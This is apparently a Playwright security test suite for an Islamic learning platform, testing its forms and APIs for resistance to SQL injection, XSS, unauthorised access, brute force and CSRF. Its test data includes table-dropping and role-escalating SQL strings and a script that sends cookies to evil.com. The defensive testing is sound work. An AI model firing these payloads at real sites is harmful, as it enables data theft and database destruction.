import { expect, Page, test } from "@playwright/test";

/**
 * SECURITY TESTING SUITE - TestSprite Requirements
 *
 * Critical security vulnerabilities that could compromise:
 * - User data and authentication
 * - Database integrity
 * - Application availability
 * - Student progress data
 * - Islamic content integrity
 *
 * These tests ensure the platform is secure for Muslim students worldwide
 */

// Security test data
const SECURITY_TEST_DATA = {
  sqlInjection: {
    // Common SQL injection payloads
    payloads: [
      "admin'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "admin'/*",
      "' OR 1=1 --",
      "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'pwned'); --",
      "' OR EXISTS(SELECT * FROM users WHERE email='admin@example.com') --",
    ],
  },
  xss: {
    // XSS payloads to test input sanitization
    payloads: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "<iframe src='javascript:alert(\"XSS\")'></iframe>",
      "';alert('XSS');//",
      "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
      "<body onload=alert('XSS')>",
    ],
  },
  authorization: {
    // Test different user roles and permissions
    studentUser: {
      email: "student@example.com",
      password: "student123",
      role: "student",
    },
    adminUser: {
      email: "admin@example.com",
      password: "admin123",
      role: "admin",
    },
    testUser: {
      email: "test@example.com",
      password: "password",
      role: "student",
    },
  },
};

// Helper functions
async function attemptLogin(page: Page, email: string, password: string) {
  await page.goto("/en/login");
  await page.getByLabel(/email/i).fill(email);
  await page
    .locator('input[type="password"][name="password"]')
    .first()
    .fill(password);
  await page.getByRole("button", { name: /login|sign in/i }).click();
  await page.waitForTimeout(2000);
}

async function checkForErrorMessages(page: Page) {
  const bodyText = (await page.locator("body").textContent()) || "";
  return {
    hasError:
      bodyText.includes("error") ||
      bodyText.includes("Error") ||
      bodyText.includes("خطأ") ||
      bodyText.includes("invalid"),
    hasSqlError:
      bodyText.toLowerCase().includes("sql") ||
      bodyText.toLowerCase().includes("database") ||
      bodyText.toLowerCase().includes("mysql") ||
      bodyText.toLowerCase().includes("postgres"),
    bodyText: bodyText.substring(0, 500), // First 500 chars for debugging
  };
}

async function testApiEndpoint(
  page: Page,
  url: string,
  method: string = "GET",
  payload?: any
) {
  try {
    const response = await page.evaluate(
      async ({ url, method, payload }) => {
        const options: RequestInit = { method };

        if (payload && method !== "GET") {
          options.body = JSON.stringify(payload);
          options.headers = { "Content-Type": "application/json" };
        }

        const res = await fetch(url, options);
        return {
          status: res.status,
          statusText: res.statusText,
          text: await res.text().catch(() => "Unable to read response"),
        };
      },
      { url, method, payload }
    );

    return response;
  } catch (error) {
    return { status: 0, statusText: "Request failed", text: String(error) };
  }
}

test.describe("SQL INJECTION PREVENTION", () => {
  test("Registration form rejects SQL injection attempts", async ({ page }) => {
    await page.goto("/register");

    for (const payload of SECURITY_TEST_DATA.sqlInjection.payloads.slice(
      0,
      3
    )) {
      // Test in email field
      await page.getByLabel(/name|الاسم/i).fill("Test User");
      await page.getByLabel(/email|البريد/i).fill(payload);
      // PhoneInput uses a different selector - find the phone input field
      await page.locator('input[type="tel"]').fill("+201001234567");
      await page.locator("#password").fill("TestPassword123!");
      await page.locator("#confirmPassword").fill("TestPassword123!");

      await page
        .getByRole("button", { name: /create account|إنشاء حساب/i })
        .click();
      await page.waitForTimeout(2000);

      const errorCheck = await checkForErrorMessages(page);

      // Should show validation error, NOT SQL error
      expect(errorCheck.hasSqlError).toBeFalsy();

      // Should either show validation error or stay on registration page
      const isStillOnRegister = page.url().includes("register");
      const hasValidationError = errorCheck.hasError;

      expect(isStillOnRegister || hasValidationError).toBeTruthy();

      console.log(
        `SQL injection test with payload "${payload.substring(0, 20)}...": ${
          errorCheck.hasSqlError ? "VULNERABLE" : "PROTECTED"
        }`
      );

      // Clear form for next test
      await page.reload();
    }
  });

  test("Login form prevents SQL injection authentication bypass", async ({
    page,
  }) => {
    for (const payload of SECURITY_TEST_DATA.sqlInjection.payloads.slice(
      0,
      4
    )) {
      await page.goto("/en/login");

      // Test injection in email field
      await page.getByLabel(/email/i).fill(payload);
      await page
        .locator('input[type="password"][name="password"]')
        .first()
        .fill("anypassword");
      await page.getByRole("button", { name: /login|sign in/i }).click();

      await page.waitForTimeout(2000);

      // Should NOT be logged in or redirected to dashboard
      const isLoggedIn = page.url().includes("dashboard");
      expect(isLoggedIn).toBeFalsy();

      const errorCheck = await checkForErrorMessages(page);
      expect(errorCheck.hasSqlError).toBeFalsy();

      console.log(
        `Login SQL injection test: ${
          isLoggedIn ? "VULNERABLE - BYPASS SUCCESSFUL" : "PROTECTED"
        }`
      );
    }
  });

  test("API endpoints reject malicious SQL payloads", async ({ page }) => {
    // Navigate to a page first to establish context
    await page.goto("/en");

    // Test quiz submission API
    const quizPayload = {
      lessonId: "1'; DROP TABLE quiz_results; --",
      answers: ["A", "B", "C"],
      score: 0,
    };

    const response = await testApiEndpoint(
      page,
      "/api/quiz/submit",
      "POST",
      quizPayload
    );

    // Should return 400 (Bad Request) for invalid lessonId format
    // The API validates input BEFORE authentication, so we expect 400, not 401
    expect(response.status).toBe(400);
    expect(response.text.toLowerCase()).toContain("invalid");
    expect(response.text.toLowerCase()).not.toContain("sql");
    expect(response.text.toLowerCase()).not.toContain("database");

    console.log(
      "Quiz API SQL injection test:",
      response.status,
      response.statusText
    );
  });

  test("User profile update rejects SQL injection", async ({ page }) => {
    // Login first
    await attemptLogin(page, "test@example.com", "password");

    if (page.url().includes("dashboard")) {
      await page.goto("/en/profile");
      await page.waitForLoadState("networkidle");

      // Try to inject SQL in name field
      const nameField = page.getByLabel(/name|الاسم/i);
      if (await nameField.isVisible({ timeout: 2000 })) {
        await nameField.fill("'; UPDATE users SET role='admin' WHERE id=1; --");

        const saveButton = page.getByRole("button", {
          name: /save|حفظ|update/i,
        });
        if (await saveButton.isVisible({ timeout: 2000 })) {
          await saveButton.click();
          await page.waitForTimeout(2000);

          const errorCheck = await checkForErrorMessages(page);
          expect(errorCheck.hasSqlError).toBeFalsy();
        }
      }
    }
  });
});

test.describe("XSS (Cross-Site Scripting) PREVENTION", () => {
  test("Registration form sanitizes XSS attempts", async ({ page }) => {
    await page.goto("/register");

    for (const payload of SECURITY_TEST_DATA.xss.payloads.slice(0, 3)) {
      // Set up alert detection BEFORE filling the form
      let alertWasCalled = false;
      await page.evaluate(() => {
        // Override alert to detect if it's called
        (window as any).alertWasCalled = false;
        window.alert = function (...args: any[]) {
          (window as any).alertWasCalled = true;
          // Don't actually show the alert in tests
          console.log("Alert was called with:", args);
        };
      });

      await page.getByLabel(/name|الاسم/i).fill(payload);
      await page.getByLabel(/email|البريد/i).fill("test@example.com");
      // PhoneInput uses a different selector - wait for it to be visible first
      const phoneInput = page.locator('input[type="tel"]');
      await phoneInput.waitFor({ state: "visible", timeout: 5000 });
      await phoneInput.fill("+201001234567");
      await page.locator("#password").fill("TestPassword123!");
      await page.locator("#confirmPassword").fill("TestPassword123!");

      await page
        .getByRole("button", { name: /create account|إنشاء حساب/i })
        .click();
      await page.waitForTimeout(1000);

      // Check if alert was called (should not be)
      alertWasCalled = await page.evaluate(
        () => (window as any).alertWasCalled
      );
      expect(alertWasCalled).toBeFalsy();

      // Check if the XSS payload appears in user-visible content (not in script tags)
      // Get only the visible text content, not the HTML source
      const visibleText = await page.locator("body").textContent();
      const payloadInVisibleText = visibleText?.includes(payload) || false;

      // If the payload appears as visible text, it's been safely escaped
      // If alert was called, it's vulnerable
      const isProtected = !alertWasCalled;

      expect(isProtected).toBeTruthy();

      console.log(
        `XSS test with "${payload.substring(0, 20)}...": ${
          isProtected ? "PROTECTED" : "VULNERABLE"
        }`
      );

      await page.reload();
    }
  });

  test("User-generated content is sanitized", async ({ page }) => {
    // Login first
    await attemptLogin(page, "test@example.com", "password");

    if (page.url().includes("dashboard")) {
      // Test if there's a notes or comment feature
      await page.goto("/en/lesson/1");
      await page.waitForLoadState("networkidle");

      // Look for notes or comment input
      const notesInput = page
        .locator(
          'textarea[placeholder*="notes"], textarea[placeholder*="ملاحظات"], #notes, .notes-input'
        )
        .first();

      if (await notesInput.isVisible({ timeout: 3000 })) {
        const xssPayload = '<img src=x onerror=alert("XSS")>';
        await notesInput.fill(xssPayload);

        const saveButton = page.getByRole("button", {
          name: /save|حفظ|submit/i,
        });
        if (await saveButton.isVisible()) {
          await saveButton.click();
          await page.waitForTimeout(1000);

          // Verify script didn't execute
          const alertFired = await page.evaluate(() => {
            return document.querySelector("img[onerror]") !== null;
          });
          expect(alertFired).toBeFalsy();
        }
      } else {
        console.log("No user content input found to test XSS");
      }
    }
  });

  test("URL parameters are sanitized", async ({ page }) => {
    // Test XSS via URL parameters
    const xssUrl =
      '/en/lesson/1?name=<script>alert("XSS")</script>&level=<img src=x onerror=alert("XSS")>';

    await page.goto(xssUrl);
    await page.waitForTimeout(1000);

    // Check if script executed
    const alertFired = await page.evaluate(() => {
      return document.documentElement.innerHTML.includes(
        '<script>alert("XSS")</script>'
      );
    });
    expect(alertFired).toBeFalsy();

    console.log("URL XSS test: PROTECTED");
  });
});

test.describe("AUTHORIZATION & ACCESS CONTROL", () => {
  test("Students cannot access admin endpoints", async ({ page }) => {
    // Login as regular student
    await attemptLogin(page, "test@example.com", "password");

    if (page.url().includes("dashboard")) {
      // Try to access admin pages
      const adminUrls = [
        "/en/admin",
        "/en/admin/users",
        "/en/admin/lessons",
        "/api/admin/users",
        "/api/admin/create-lesson",
      ];

      for (const url of adminUrls) {
        await page.goto(url);
        await page.waitForLoadState("networkidle");

        // Should be redirected or show 403/401
        const isOnAdminPage =
          page.url().includes("admin") &&
          !page.url().includes("unauthorized") &&
          !page.url().includes("403");

        expect(isOnAdminPage).toBeFalsy();

        // Check for access denied message
        const bodyText = (await page.locator("body").textContent()) || "";
        const hasAccessDenied =
          bodyText.includes("403") ||
          bodyText.includes("Unauthorized") ||
          bodyText.includes("Access denied") ||
          bodyText.includes("غير مصرح");

        console.log(
          `Admin access test for ${url}: ${
            isOnAdminPage ? "VULNERABLE" : "PROTECTED"
          }`
        );
      }
    }
  });

  test("Users cannot access other users' data", async ({ page }) => {
    // Login as test user
    await attemptLogin(page, "test@example.com", "password");

    if (page.url().includes("dashboard")) {
      // Try to access another user's data via API endpoints
      // Note: Page routes like /en/profile?userId=2 are expected to return 200
      // but should ignore the userId parameter and show only the logged-in user's data
      const apiEndpoints = [
        "/api/user/2/progress",
        "/api/user/999/profile",
        "/api/quiz/results?userId=2",
      ];

      for (const url of apiEndpoints) {
        const response = await testApiEndpoint(page, url, "GET");

        // API endpoints should return 401/403/404, not user data
        expect(response.status).toBeGreaterThanOrEqual(401);

        console.log(
          `User data access test for ${url}: Status ${response.status}`
        );
      }

      // Test page routes - they should return 200 but only show logged-in user's data
      await page.goto("/en/profile?userId=2");
      await page.waitForTimeout(1000);

      // Should still be on profile page (200 response)
      expect(page.url()).toContain("/profile");

      // But should show the logged-in user's data, not user ID 2's data
      // The page should ignore the userId parameter
      const pageContent = await page.locator("body").textContent();
      expect(pageContent).toContain("test@example.com"); // Logged-in user's email

      console.log("Profile page correctly ignores userId parameter");
    }
  });

  test("Unauthenticated users cannot access protected content", async ({
    page,
  }) => {
    // Ensure logged out
    await page.goto("/");

    // Try to access protected pages
    const protectedUrls = [
      "/en/dashboard",
      "/en/lesson/1",
      "/en/quiz/1",
      "/en/profile",
      "/api/dashboard/stats",
      "/api/quiz/submit",
    ];

    for (const url of protectedUrls) {
      await page.goto(url);
      await page.waitForTimeout(1000);

      // Should be redirected to login
      const isRedirectedToLogin = page.url().includes("login");

      if (!isRedirectedToLogin && url.startsWith("/api/")) {
        // For API endpoints, check response status
        const response = await testApiEndpoint(page, url, "GET");
        // Accept either 401 (Unauthorized) or 405 (Method Not Allowed for POST-only endpoints)
        expect([401, 405]).toContain(response.status);
      } else {
        expect(isRedirectedToLogin).toBeTruthy();
      }

      console.log(
        `Protected access test for ${url}: ${
          isRedirectedToLogin ? "PROTECTED" : "CHECK NEEDED"
        }`
      );
    }
  });

  test("Session management is secure", async ({ page, context }) => {
    // Login
    await attemptLogin(page, "test@example.com", "password");

    if (page.url().includes("dashboard")) {
      // Get cookies
      const cookies = await context.cookies();
      const sessionCookie = cookies.find(
        (c) =>
          c.name.includes("session") ||
          c.name.includes("auth") ||
          c.name.includes("token")
      );

      if (sessionCookie) {
        // Check secure flags
        expect(sessionCookie.httpOnly).toBeTruthy(); // Should be HttpOnly
        // expect(sessionCookie.secure).toBeTruthy(); // Should be Secure in production

        console.log("Session cookie security:", {
          httpOnly: sessionCookie.httpOnly,
          secure: sessionCookie.secure,
          sameSite: sessionCookie.sameSite,
        });
      }

      // Test session expiration
      await context.clearCookies();
      await page.reload();

      // Should be logged out
      const stillLoggedIn = page.url().includes("dashboard");
      expect(stillLoggedIn).toBeFalsy();
    }
  });
});

test.describe("RATE LIMITING & DOS PROTECTION", () => {
  test("Login rate limiting prevents brute force", async ({ page }) => {
    // Navigate to login page once
    await page.goto("/en/login");

    const maxAttempts = 6; // Test 6 rapid login attempts
    let blockedAttempts = 0;

    for (let i = 0; i < maxAttempts; i++) {
      // Fill form and submit without reloading page
      await page.getByLabel(/email/i).fill("test@example.com");
      await page
        .locator('input[type="password"][name="password"]')
        .first()
        .fill("wrongpassword");
      await page.getByRole("button", { name: /login|sign in/i }).click();

      await page.waitForTimeout(1000); // Wait for response

      const bodyText = (await page.locator("body").textContent()) || "";
      const isBlocked =
        bodyText.toLowerCase().includes("too many") ||
        bodyText.toLowerCase().includes("rate limit") ||
        bodyText.toLowerCase().includes("try again later") ||
        bodyText.includes("محاولات كثيرة");

      if (isBlocked) {
        blockedAttempts++;
        console.log(`Blocked after ${i + 1} attempts`);
        break;
      }

      // Clear form for next attempt
      await page.getByLabel(/email/i).clear();
      await page
        .locator('input[type="password"][name="password"]')
        .first()
        .clear();
    }

    // Should have some rate limiting (at least after 5-6 attempts)
    if (maxAttempts >= 5) {
      expect(blockedAttempts).toBeGreaterThan(0);
    }

    console.log(
      `Rate limiting test: ${
        blockedAttempts > 0 ? "PROTECTED" : "CHECK NEEDED"
      }`
    );
  });

  test("API rate limiting works", async ({ page }) => {
    // Rapid API requests
    const requests = [];
    const apiUrl = "/api/dashboard/stats";

    for (let i = 0; i < 10; i++) {
      requests.push(testApiEndpoint(page, apiUrl, "GET"));
    }

    const responses = await Promise.all(requests);
    const blockedRequests = responses.filter(
      (r) => r.status === 429 || r.status === 503
    );

    console.log(
      `API rate limiting: ${blockedRequests.length}/10 requests blocked`
    );

    // Should have some rate limiting for rapid requests
    // expect(blockedRequests.length).toBeGreaterThan(0);
  });
});

test.describe("CSRF PROTECTION", () => {
  test("Forms include CSRF protection", async ({ page }) => {
    await page.goto("/register");

    // Check for CSRF token in form
    const csrfToken = await page
      .locator(
        'input[name="_token"], input[name="csrf_token"], input[name="authenticity_token"]'
      )
      .first();
    const csrfMeta = await page.locator('meta[name="csrf-token"]').first();

    const hasCSRFProtection =
      (await csrfToken.isVisible({ timeout: 2000 })) ||
      (await csrfMeta.isVisible({ timeout: 2000 }));

    // Modern apps might use other CSRF protection methods
    console.log("CSRF token found:", hasCSRFProtection);

    // For now, just verify the form doesn't accept external submissions easily
    // This would require more sophisticated testing with external origin requests
  });
});

test.describe("INPUT VALIDATION", () => {
  test("File upload security", async ({ page }) => {
    // Login as admin
    await attemptLogin(page, "admin@example.com", "admin123");

    if (page.url().includes("dashboard")) {
      await page.goto("/en/admin/lessons");
      await page.waitForLoadState("networkidle");

      // Look for file upload
      const fileInput = page.locator('input[type="file"]').first();

      if (await fileInput.isVisible({ timeout: 2000 })) {
        // Test would require creating malicious files
        // For now, just verify upload exists and has restrictions

        const acceptAttr = await fileInput.getAttribute("accept");
        console.log("File upload accept attribute:", acceptAttr);

        // Should have restrictions (PDF only, etc.)
        if (acceptAttr) {
          expect(acceptAttr).toMatch(/pdf|image/i);
        }
      }
    }
  });

  test("Email validation prevents malicious patterns", async ({ page }) => {
    await page.goto("/register");

    const maliciousEmails = [
      'test@"<script>alert(1)</script>".com',
      "test+<script>@example.com",
      "test@example.com<script>alert(1)</script>",
      "admin@localhost",
      "",
    ];

    for (const email of maliciousEmails) {
      await page.getByLabel(/name|الاسم/i).fill("Test User");
      await page.getByLabel(/email|البريد/i).fill(email);
      // PhoneInput uses a different selector - find the phone input field
      await page.locator('input[type="tel"]').fill("+201001234567");
      await page.locator("#password").fill("TestPassword123!");
      await page.locator("#confirmPassword").fill("TestPassword123!");

      await page
        .getByRole("button", { name: /create account|إنشاء حساب/i })
        .click();
      await page.waitForTimeout(1000);

      // Should show validation error or stay on page
      const isStillOnRegister = page.url().includes("register");
      expect(isStillOnRegister).toBeTruthy();

      await page.reload();
    }
  });
});

test.describe("CONTENT SECURITY", () => {
  test("Islamic content cannot be tampered with", async ({ page }) => {
    // This is a conceptual test - ensuring Quranic verses, Hadith text, etc.
    // cannot be modified by users through XSS or other means

    await page.goto("/en/lesson/1");
    await page.waitForLoadState("networkidle");

    // Check that content areas are not editable
    const contentArea = page
      .locator(".lesson-content, .arabic-text, .quran-verse")
      .first();

    if (await contentArea.isVisible({ timeout: 2000 })) {
      const isEditable = await contentArea.getAttribute("contenteditable");
      expect(isEditable).not.toBe("true");

      // Verify content integrity (this would need checksums in real implementation)
      const content = await contentArea.textContent();
      expect(content).toBeTruthy();
      expect(content!.length).toBeGreaterThan(0);
    }
  });

  test("No sensitive data in client-side code", async ({ page }) => {
    await page.goto("/en");

    // Check page source for sensitive patterns
    const pageContent = await page.content();

    // Should not contain database passwords, API keys, etc.
    expect(pageContent).not.toMatch(/password\s*[:=]\s*['"][^'"]*['"]/i);
    expect(pageContent).not.toMatch(/api[_-]?key\s*[:=]\s*['"][^'"]*['"]/i);
    expect(pageContent).not.toMatch(/secret\s*[:=]\s*['"][^'"]*['"]/i);
    expect(pageContent).not.toMatch(/mysql|postgres|database.*password/i);

    console.log("Client-side security scan: No sensitive data found");
  });
});
